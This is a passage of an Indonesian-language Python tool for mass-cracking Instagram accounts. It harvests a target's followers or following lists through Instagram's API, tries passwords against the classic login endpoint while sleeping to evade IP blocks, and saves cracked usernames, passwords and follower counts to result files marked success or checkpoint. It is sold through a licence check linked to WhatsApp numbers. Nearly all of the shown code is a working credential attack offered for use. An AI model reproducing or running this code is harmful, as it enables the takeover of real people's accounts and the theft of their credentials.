			token = re.search('name="csrfmiddlewaretoken" value="(\\w+)"/>', str(response)).group(1)
			head = {
                    'Host': 'z-p42.www.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '296',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36',
                    'Origin': 'https://z-p42.www.instagram.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'dnt': '1',
                    'X-Requested-With': 'mark.via.gp',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Sec-Fetch-Dest': 'document',
                    'Referer': 'https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    }
			param={
					'csrfmiddlewaretoken': token,
					'username': usr,
					'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}'
					}
			respon=ses.post("https://z-p42.www.instagram.com/accounts/login/?force_classic_login&hl=en", headers = head, data = param, allow_redirects=True)
			if "userId" in str(respon.text) or "sessionid" in ses.cookies.get_dict():
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print("OK")
				print(f"{H}{usr} {P}| {H}{pwd}{P}\n")
				open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'href="https://www.instagram.com/challenge/action/"' in str(respon.text):
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print("CP")
				print(f"{K}{usr} {P}| {K}{pwd}{P}\n")
				open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'ip_block' in str(respon.text):
				sys.stdout.write(f'\r {P}[{M}#{P}] {M}spamIP {N}{len(usr)}{P}');sys.stdout.flush()
				time.sleep(5)
				self.checkAPI(usr, pwd)
		except:
			self.checkAPI(usr,pwd)

	def menu(self):
		self.logo()
		c=input(f'\n{P}[{H}+{P}] Chouse : {H}')
		if c=='':
			self.menu()
		
		elif c in ('17','91'):
			m=int(input(f'{P}[{H}+{P}] masukan jumlah target : '))
			for i in range(m):
				i+1
				i+=1
				nama=input(f'{P}[{H}+{P}] masukan nama {B}{len(internal)}{P} : ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
			
		elif c in ('1','01'):
			mas=input(f"{P}[{H}+{P}] apakah anda ingin crack massal? {P}({H}y{P}/{M}t{P}) : ")
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print(f"{P}[{M}!{P}] jangan kosong!")
				exit()

		elif c in ('2','02'):
			mas=input(f"{P}[{H}+{P}] apakah anda ingin crack massal? Y/t : {H}")
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print(f"{P}[{B}?{P}] jangan kosong!")
				exit()


		elif c in ('3','03'):
			print(f'{P}[{M}×{P}] menu off bang')
			time.sleep(4)
			for i in os.listdir('result'):
				print(f'{P}[{B}+{P}] {i}')
			c=input(f'{P}[{B}?{P}] masukan nama file : {H}')
			g=open("result/%s"%(c)).read().splitlines()
			jalan(f'\n{P}[{B}?{P}] total result di temukan : {H}{len(g)}{P}')
			prints(Panel(f"sedang mengecek status akun harap tunggu sebentar",width=80))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			jalan(f"{P}[{H}+{P}] proses check akun selesai...")
			exit()

		elif c in ('8','08'):
			time.sleep(4)
			for i in os.listdir('result'):
				print(f'{P}[{H}+{P}] {i}')
			c=input(f'{P}[{H}+{P}] masukan nama file : ')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				ful=s.split("|")[3]
				if xc=="checkpoint":
					print(f"""
{P}[{K}+{P}] {K}CHECK{P}
 {P}|{P}
 {P}├╴>{P} username  : {K}{usr}{C}
 {P}├╴>{P} password  : {K}{pwd}{C}
 {P}├╴>{P} followers : {K}{fol}{C}
 {P}├╴>{P} following : {K}{ful}{C}
					""");sleep(0.05)
				else:
					print(f"""
{P}[{H}+{P}] {H}LIVE{P}
 {P}|{P}
 {P}├╴>{P} username  : {H}{usr}{C}
 {P}├╴>{P} password  : {H}{pwd}{C}
 {P}├╴>{P} followers : {H}{fol}{C}
 {P}├╴>{P} following : {H}{ful}{C}
					""");sleep(0.05)
		
		elif c in ('s6','06s'):
			print(f'{P}[{M}!{P}] bot auto unfollow sedang dalam proses maintenance')
			time.sleep(2)
			self.menu()

		elif c in ('s7','0s7'):
			self.HapusLisen()
			
		elif c in ('0','00'):
			self.Exit()

		else:
			print(f'{P}')
			prints(Panel(f"""{warna_putih}menu ini khusus penguna {warna_hijau}premium{warna_putih} user {warna_kuning}trial{warna_putih} di larang memakai menu ini"""))
		exit()
def login_lisen():
	banner()
	print(f' KETIK open UNTUK MEMBELI LISENSI')
	sa = input(f'{B}•{P} Masukan Lisensi : ')
	loading()	
	if sa in ['open','Open','OPEN']:
		os.system('xdg-open http://wa.me/6289669084331')
		exit()
	elif sa in ['']:
		print(f'{P} jangan kosong')
	elif sa in ['GOWPZNCRDSXJGFJ']:
		print(f'{P}[{H}√{P}] Lisensi Login')
		ggwp17()
	else:
		print(f'{M}[×] {P}Lisensi Tidak Login')
def tlisensi():
    lu()
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/+6281221523195?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()
    
def lisensi():
 try:
  cek=open('.lisen.txt').read()
  lisensikuni.append(cek)
 except:
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
  li()
  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
  time.sleep(2)
  lisensiku.append("sukses")
  ggwp17()
 elif status ==KeyError:
  os.system('rm .lisen.txt')
 else:
  tlisensi()

def mengi(self):
			try:
				menudump.append('mengikuti')
				m=int(input(f'{P}[{H}+{P}] masukan jumlah target : '))
			except:m=1
			for t in range(m):
				t +=1
				nama=input(f'{P}[{H}+{P}] masukan username : {H}')
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)

def meng(self):
		menudump.append('mengikuti')
		nama=input(f'{P}[{M}+{P}] masukan username : ')
		id=self.idAPI(self.cookie,nama)
		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.passwordAPI(info)

def masal(self):
			try:
				menudump.append('pengikut')
				m=int(input(f'{P}[{H}+{P}] masukan jumlah target : {H}'))
			except:m=1
			for t in range(m):
				t +=1
				nama=input(f'{P}[{B}?{P}] masukan username : {H}')
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

def massal(self):
			menudump.append('pengikut')
			m=input(f'{P}[{H}+{P}] masukan username : ')
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())

kentod = random.choice(["KHRHE-UKDM-UOFJR-LBRJ","MORHE-UUQDM-OOFJR-IBRJZ","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])
kentodd=random.choice([kentod])
crot=(kentodd)



if __name__=="__main__":
	lisensiku.append("sukses")
	try:
	    with requests.Session() as ses:
	         ko = ses.get('https://pastebin.com/raw/0cWckNrU').json()
	         HARIS.update(ko)
	         ki = ses.get('https://pastebin.com/raw/9GybVKaq').json()
	         HARIS1.update(ki)
	         ggwp17()
	except requests.exceptions.ConnectionError:
		print(f'{P}[{M}!{P}] koneksi internet anda bermasalah')
		time.sleep(0.03)
		exit()
		
